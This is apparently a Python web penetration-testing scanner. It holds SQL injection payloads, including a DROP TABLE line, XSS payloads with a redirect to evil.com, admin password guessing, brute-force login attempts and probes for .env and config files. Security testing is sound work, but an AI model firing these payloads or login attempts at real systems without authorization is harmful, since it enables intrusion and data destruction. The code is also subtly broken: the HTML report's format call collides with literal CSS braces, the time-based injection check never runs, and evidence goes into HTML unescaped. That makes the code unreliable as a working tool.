"""
Penetration Testing Framework
Automated security testing and vulnerability assessment
"""

import asyncio
import aiohttp
import json
import re
import ssl
import socket
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
from urllib.parse import urljoin, urlparse
from enum import Enum
import structlog

logger = structlog.get_logger()


class SeverityLevel(Enum):
    """Vulnerability severity levels"""
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class TestCategory(Enum):
    """Penetration test categories"""
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    INPUT_VALIDATION = "input_validation"
    SESSION_MANAGEMENT = "session_management"
    CRYPTO = "cryptography"
    BUSINESS_LOGIC = "business_logic"
    INFORMATION_DISCLOSURE = "information_disclosure"
    INFRASTRUCTURE = "infrastructure"


@dataclass
class Vulnerability:
    """Vulnerability finding"""
    id: str
    title: str
    description: str
    severity: SeverityLevel
    category: TestCategory
    affected_url: str
    method: str = "GET"
    evidence: Dict = None
    recommendation: str = ""
    cwe_id: Optional[str] = None
    cvss_score: Optional[float] = None
    discovered_at: datetime = None

    def __post_init__(self):
        if self.evidence is None:
            self.evidence = {}
        if self.discovered_at is None:
            self.discovered_at = datetime.now()


@dataclass
class TestResult:
    """Test execution result"""
    test_name: str
    passed: bool
    vulnerabilities: List[Vulnerability]
    execution_time: float
    details: Dict = None


class SQLInjectionTester:
    """SQL Injection vulnerability testing"""

    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "1' OR '1'='1",
            "admin'--",
            "admin' /*",
            "' OR 1=1#",
            "' OR 'x'='x",
            "') OR ('1'='1",
        ]

        self.error_patterns = [
            r"mysql_fetch_array\(\)",
            r"ORA-\d{5}",
            r"Microsoft OLE DB Provider",
            r"PostgreSQL.*ERROR",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"SQLException",
            r"SQLite.*error",
            r"sqlite3\.OperationalError",
        ]

    async def test_parameter(self, session: aiohttp.ClientSession, url: str,
                           param_name: str, param_value: str) -> List[Vulnerability]:
        """Test a parameter for SQL injection"""
        vulnerabilities = []

        for payload in self.payloads:
            try:
                # Test with payload
                test_params = {param_name: payload}
                async with session.get(url, params=test_params) as response:
                    response_text = await response.text()

                    # Check for SQL error patterns
                    for pattern in self.error_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            vulnerability = Vulnerability(
                                id=f"sqli_{param_name}_{len(vulnerabilities)}",
                                title="SQL Injection Vulnerability",
                                description=f"SQL injection detected in parameter '{param_name}'",
                                severity=SeverityLevel.HIGH,
                                category=TestCategory.INPUT_VALIDATION,
                                affected_url=url,
                                method="GET",
                                evidence={
                                    "parameter": param_name,
                                    "payload": payload,
                                    "error_pattern": pattern,
                                    "response_snippet": response_text[:500]
                                },
                                recommendation="Use parameterized queries and input validation",
                                cwe_id="CWE-89"
                            )
                            vulnerabilities.append(vulnerability)
                            break

                    # Check for time-based SQL injection
                    if "SLEEP(" in payload.upper() or "WAITFOR" in payload.upper():
                        start_time = datetime.now()
                        async with session.get(url, params=test_params) as time_response:
                            await time_response.text()
                        execution_time = (datetime.now() - start_time).total_seconds()

                        if execution_time > 5:  # Assuming 5+ second delay indicates time-based SQLi
                            vulnerability = Vulnerability(
                                id=f"sqli_time_{param_name}_{len(vulnerabilities)}",
                                title="Time-based SQL Injection",
                                description=f"Time-based SQL injection detected in parameter '{param_name}'",
                                severity=SeverityLevel.HIGH,
                                category=TestCategory.INPUT_VALIDATION,
                                affected_url=url,
                                evidence={
                                    "parameter": param_name,
                                    "payload": payload,
                                    "execution_time": execution_time
                                },
                                recommendation="Use parameterized queries and input validation"
                            )
                            vulnerabilities.append(vulnerability)

            except Exception as e:
                logger.warning("Error testing SQL injection", error=str(e), url=url)

        return vulnerabilities


class XSSTester:
    """Cross-Site Scripting vulnerability testing"""

    def __init__(self):
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click me</div>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com'</script>",
        ]

    async def test_parameter(self, session: aiohttp.ClientSession, url: str,
                           param_name: str, param_value: str) -> List[Vulnerability]:
        """Test a parameter for XSS"""
        vulnerabilities = []

        for payload in self.payloads:
            try:
                test_params = {param_name: payload}
                async with session.get(url, params=test_params) as response:
                    response_text = await response.text()

                    # Check if payload is reflected in response
                    if payload in response_text:
                        # Check if it's in a dangerous context
                        dangerous_contexts = [
                            r'<script[^>]*>' + re.escape(payload),
                            r'<[^>]*\s+on\w+\s*=\s*["\']?' + re.escape(payload),
                            r'<[^>]*\s+href\s*=\s*["\']?' + re.escape(payload),
                            r'<[^>]*\s+src\s*=\s*["\']?' + re.escape(payload),
                        ]

                        for context_pattern in dangerous_contexts:
                            if re.search(context_pattern, response_text, re.IGNORECASE):
                                vulnerability = Vulnerability(
                                    id=f"xss_{param_name}_{len(vulnerabilities)}",
                                    title="Cross-Site Scripting (XSS)",
                                    description=f"XSS vulnerability detected in parameter '{param_name}'",
                                    severity=SeverityLevel.MEDIUM,
                                    category=TestCategory.INPUT_VALIDATION,
                                    affected_url=url,
                                    evidence={
                                        "parameter": param_name,
                                        "payload": payload,
                                        "context": context_pattern
                                    },
                                    recommendation="Implement proper input validation and output encoding",
                                    cwe_id="CWE-79"
                                )
                                vulnerabilities.append(vulnerability)
                                break

            except Exception as e:
                logger.warning("Error testing XSS", error=str(e), url=url)

        return vulnerabilities


class AuthenticationTester:
    """Authentication vulnerability testing"""

    async def test_weak_passwords(self, session: aiohttp.ClientSession,
                                 login_url: str) -> List[Vulnerability]:
        """Test for weak password policies"""
        vulnerabilities = []
        weak_passwords = [
            "password", "123456", "admin", "test", "guest",
            "password123", "admin123", "qwerty", "letmein"
        ]

        for password in weak_passwords:
            try:
                login_data = {
                    "username": "admin",
                    "password": password
                }

                async with session.post(login_url, data=login_data) as response:
                    if response.status == 200:
                        response_text = await response.text()

                        # Check for successful login indicators
                        success_indicators = [
                            "dashboard", "welcome", "logout", "profile",
                            "authenticated", "session", "token"
                        ]

                        if any(indicator in response_text.lower() for indicator in success_indicators):
                            vulnerability = Vulnerability(
                                id=f"weak_password_{password}",
                                title="Weak Password Policy",
                                description=f"Weak password '{password}' accepted",
                                severity=SeverityLevel.HIGH,
                                category=TestCategory.AUTHENTICATION,
                                affected_url=login_url,
                                method="POST",
                                evidence={
                                    "username": "admin",
                                    "password": password,
                                    "response_status": response.status
                                },
                                recommendation="Implement strong password policies",
                                cwe_id="CWE-521"
                            )
                            vulnerabilities.append(vulnerability)

            except Exception as e:
                logger.warning("Error testing weak passwords", error=str(e))

        return vulnerabilities

    async def test_brute_force_protection(self, session: aiohttp.ClientSession,
                                        login_url: str) -> List[Vulnerability]:
        """Test for brute force protection"""
        vulnerabilities = []

        try:
            # Attempt multiple failed logins
            for i in range(10):
                login_data = {
                    "username": "admin",
                    "password": f"wrongpassword{i}"
                }

                async with session.post(login_url, data=login_data) as response:
                    if response.status == 429:  # Rate limited
                        return vulnerabilities  # Protection is working

                await asyncio.sleep(0.1)  # Small delay between attempts

            # If we reach here, no rate limiting was detected
            vulnerability = Vulnerability(
                id="no_brute_force_protection",
                title="Missing Brute Force Protection",
                description="No rate limiting detected on login endpoint",
                severity=SeverityLevel.MEDIUM,
                category=TestCategory.AUTHENTICATION,
                affected_url=login_url,
                method="POST",
                evidence={
                    "attempts": 10,
                    "rate_limiting": "not_detected"
                },
                recommendation="Implement account lockout and rate limiting",
                cwe_id="CWE-307"
            )
            vulnerabilities.append(vulnerability)

        except Exception as e:
            logger.warning("Error testing brute force protection", error=str(e))

        return vulnerabilities


class InformationDisclosureTester:
    """Information disclosure vulnerability testing"""

    async def test_error_handling(self, session: aiohttp.ClientSession,
                                base_url: str) -> List[Vulnerability]:
        """Test for information disclosure in error messages"""
        vulnerabilities = []

        # Test various error-inducing requests
        test_paths = [
            "/admin",
            "/config.php",
            "/admin.php",
            "/phpinfo.php",
            "/test.asp",
            "/error",
            "/debug",
            "/.env",
            "/config.json",
            "/app.config",
        ]

        for path in test_paths:
            try:
                url = urljoin(base_url, path)
                async with session.get(url) as response:
                    response_text = await response.text()

                    # Check for sensitive information disclosure
                    sensitive_patterns = [
                        r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?(\w+)",
                        r"(?i)(api[_\-]?key|apikey)\s*[:=]\s*['\"]?(\w+)",
                        r"(?i)(secret|token)\s*[:=]\s*['\"]?(\w+)",
                        r"(?i)(database|db)[_\-]?(host|server|url)\s*[:=]\s*['\"]?([^\s'\"]+)",
                        r"Stack trace|Traceback|Exception",
                        r"SQL.*Error|MySQL.*Error|PostgreSQL.*Error",
                        r"Fatal error|Warning.*on line",
                    ]

                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, response_text)
                        if matches:
                            vulnerability = Vulnerability(
                                id=f"info_disclosure_{path.replace('/', '_')}",
                                title="Information Disclosure",
                                description=f"Sensitive information disclosed at {path}",
                                severity=SeverityLevel.MEDIUM,
                                category=TestCategory.INFORMATION_DISCLOSURE,
                                affected_url=url,
                                evidence={
                                    "path": path,
                                    "pattern": pattern,
                                    "matches": matches[:3]  # First 3 matches
                                },
                                recommendation="Remove sensitive information from error messages",
                                cwe_id="CWE-200"
                            )
                            vulnerabilities.append(vulnerability)

            except Exception as e:
                logger.warning("Error testing information disclosure", error=str(e), path=path)

        return vulnerabilities


class PenetrationTestSuite:
    """Main penetration testing suite"""

    def __init__(self, base_url: str, headers: Optional[Dict] = None):
        self.base_url = base_url
        self.headers = headers or {}
        self.session = None
        self.vulnerabilities: List[Vulnerability] = []

        # Initialize testers
        self.sql_tester = SQLInjectionTester()
        self.xss_tester = XSSTester()
        self.auth_tester = AuthenticationTester()
        self.info_tester = InformationDisclosureTester()

    async def __aenter__(self):
        """Async context manager entry"""
        connector = aiohttp.TCPConnector(ssl=False)  # For testing purposes
        self.session = aiohttp.ClientSession(
            headers=self.headers,
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30)
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()

    async def run_full_scan(self) -> Dict[str, Any]:
        """Run comprehensive penetration test"""
        start_time = datetime.now()
        results = {}

        logger.info("Starting penetration test", target=self.base_url)

        # Test categories
        test_methods = [
            ("SQL Injection", self._test_sql_injection),
            ("XSS", self._test_xss),
            ("Authentication", self._test_authentication),
            ("Information Disclosure", self._test_information_disclosure),
            ("SSL/TLS", self._test_ssl_tls),
        ]

        for test_name, test_method in test_methods:
            try:
                logger.info("Running test", test=test_name)
                test_result = await test_method()
                results[test_name] = test_result

                # Add vulnerabilities to main list
                if isinstance(test_result, TestResult):
                    self.vulnerabilities.extend(test_result.vulnerabilities)

            except Exception as e:
                logger.error("Test failed", test=test_name, error=str(e))
                results[test_name] = TestResult(
                    test_name=test_name,
                    passed=False,
                    vulnerabilities=[],
                    execution_time=0.0,
                    details={"error": str(e)}
                )

        execution_time = (datetime.now() - start_time).total_seconds()

        return {
            "scan_summary": {
                "target": self.base_url,
                "start_time": start_time.isoformat(),
                "execution_time": execution_time,
                "total_vulnerabilities": len(self.vulnerabilities),
                "severity_breakdown": self._get_severity_breakdown()
            },
            "test_results": results,
            "vulnerabilities": [asdict(v) for v in self.vulnerabilities]
        }

    async def _test_sql_injection(self) -> TestResult:
        """Test for SQL injection vulnerabilities"""
        start_time = datetime.now()
        vulnerabilities = []

        # Test common endpoints with parameters
        test_endpoints = [
            ("/api/v1/users", {"id": "1"}),
            ("/api/v1/search", {"q": "test"}),
            ("/login", {"username": "admin"}),
        ]

        for endpoint, params in test_endpoints:
            url = urljoin(self.base_url, endpoint)
            for param_name, param_value in params.items():
                vulns = await self.sql_tester.test_parameter(
                    self.session, url, param_name, param_value
                )
                vulnerabilities.extend(vulns)

        execution_time = (datetime.now() - start_time).total_seconds()

        return TestResult(
            test_name="SQL Injection",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            execution_time=execution_time
        )

    async def _test_xss(self) -> TestResult:
        """Test for XSS vulnerabilities"""
        start_time = datetime.now()
        vulnerabilities = []

        # Test common endpoints with parameters
        test_endpoints = [
            ("/api/v1/search", {"q": "test"}),
            ("/contact", {"message": "test"}),
            ("/profile", {"name": "test"}),
        ]

        for endpoint, params in test_endpoints:
            url = urljoin(self.base_url, endpoint)
            for param_name, param_value in params.items():
                vulns = await self.xss_tester.test_parameter(
                    self.session, url, param_name, param_value
                )
                vulnerabilities.extend(vulns)

        execution_time = (datetime.now() - start_time).total_seconds()

        return TestResult(
            test_name="XSS",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            execution_time=execution_time
        )

    async def _test_authentication(self) -> TestResult:
        """Test authentication mechanisms"""
        start_time = datetime.now()
        vulnerabilities = []

        login_url = urljoin(self.base_url, "/auth/login")

        # Test weak passwords
        weak_pass_vulns = await self.auth_tester.test_weak_passwords(
            self.session, login_url
        )
        vulnerabilities.extend(weak_pass_vulns)

        # Test brute force protection
        brute_force_vulns = await self.auth_tester.test_brute_force_protection(
            self.session, login_url
        )
        vulnerabilities.extend(brute_force_vulns)

        execution_time = (datetime.now() - start_time).total_seconds()

        return TestResult(
            test_name="Authentication",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            execution_time=execution_time
        )

    async def _test_information_disclosure(self) -> TestResult:
        """Test for information disclosure"""
        start_time = datetime.now()

        vulnerabilities = await self.info_tester.test_error_handling(
            self.session, self.base_url
        )

        execution_time = (datetime.now() - start_time).total_seconds()

        return TestResult(
            test_name="Information Disclosure",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            execution_time=execution_time
        )

    async def _test_ssl_tls(self) -> TestResult:
        """Test SSL/TLS configuration"""
        start_time = datetime.now()
        vulnerabilities = []

        try:
            parsed_url = urlparse(self.base_url)
            hostname = parsed_url.hostname
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)

            if parsed_url.scheme == 'https':
                # Test SSL configuration
                context = ssl.create_default_context()

                with socket.create_connection((hostname, port), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        ssock.getpeercert()
                        cipher = ssock.cipher()

                        # Check for weak ciphers
                        if cipher and cipher[1] < 128:  # Key size less than 128 bits
                            vulnerability = Vulnerability(
                                id="weak_ssl_cipher",
                                title="Weak SSL Cipher",
                                description=f"Weak cipher detected: {cipher}",
                                severity=SeverityLevel.MEDIUM,
                                category=TestCategory.CRYPTO,
                                affected_url=self.base_url,
                                evidence={"cipher": cipher},
                                recommendation="Use strong SSL ciphers (256-bit)"
                            )
                            vulnerabilities.append(vulnerability)

        except Exception as e:
            logger.warning("SSL/TLS test failed", error=str(e))

        execution_time = (datetime.now() - start_time).total_seconds()

        return TestResult(
            test_name="SSL/TLS",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            execution_time=execution_time
        )

    def _get_severity_breakdown(self) -> Dict[str, int]:
        """Get breakdown of vulnerabilities by severity"""
        breakdown = {severity.value: 0 for severity in SeverityLevel}

        for vuln in self.vulnerabilities:
            breakdown[vuln.severity.value] += 1

        return breakdown

    def generate_report(self, scan_results: Dict) -> str:
        """Generate HTML report from scan results"""
        html_template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Penetration Test Report</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .header { background: #f8f9fa; padding: 20px; border-left: 4px solid #007bff; }
                .summary { margin: 20px 0; }
                .vulnerability { margin: 15px 0; padding: 15px; border-left: 4px solid #dc3545; background: #f8f9fa; }
                .critical { border-left-color: #dc3545; }
                .high { border-left-color: #fd7e14; }
                .medium { border-left-color: #ffc107; }
                .low { border-left-color: #28a745; }
                .info { border-left-color: #17a2b8; }
                pre { background: #f8f9fa; padding: 10px; overflow-x: auto; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Penetration Test Report</h1>
                <p><strong>Target:</strong> {target}</p>
                <p><strong>Scan Date:</strong> {scan_date}</p>
                <p><strong>Total Vulnerabilities:</strong> {total_vulns}</p>
            </div>

            <div class="summary">
                <h2>Severity Breakdown</h2>
                {severity_breakdown}
            </div>

            <div class="vulnerabilities">
                <h2>Vulnerabilities Found</h2>
                {vulnerabilities}
            </div>
        </body>
        </html>
        """

        # Generate severity breakdown HTML
        severity_html = ""
        for severity, count in scan_results["scan_summary"]["severity_breakdown"].items():
            severity_html += f"<p><strong>{severity.title()}:</strong> {count}</p>"

        # Generate vulnerabilities HTML
        vulns_html = ""
        for vuln_data in scan_results["vulnerabilities"]:
            vuln_html = f"""
            <div class="vulnerability {vuln_data['severity']}">
                <h3>{vuln_data['title']}</h3>
                <p><strong>Severity:</strong> {vuln_data['severity'].title()}</p>
                <p><strong>URL:</strong> {vuln_data['affected_url']}</p>
                <p><strong>Description:</strong> {vuln_data['description']}</p>
                <p><strong>Recommendation:</strong> {vuln_data['recommendation']}</p>
                <details>
                    <summary>Evidence</summary>
                    <pre>{json.dumps(vuln_data['evidence'], indent=2)}</pre>
                </details>
            </div>
            """
            vulns_html += vuln_html

        return html_template.format(
            target=scan_results["scan_summary"]["target"],
            scan_date=scan_results["scan_summary"]["start_time"],
            total_vulns=scan_results["scan_summary"]["total_vulnerabilities"],
            severity_breakdown=severity_html,
            vulnerabilities=vulns_html
        )


# CLI interface for running penetration tests
async def run_pen_test(target_url: str, output_file: Optional[str] = None) -> Dict:
    """Run penetration test on target URL"""
    async with PenetrationTestSuite(target_url) as pen_test:
        results = await pen_test.run_full_scan()

        if output_file:
            report_html = pen_test.generate_report(results)
            with open(output_file, 'w') as f:
                f.write(report_html)
            logger.info("Report saved", file=output_file)

        return results


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python pen_test_framework.py <target_url> [output_file]")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    asyncio.run(run_pen_test(target, output))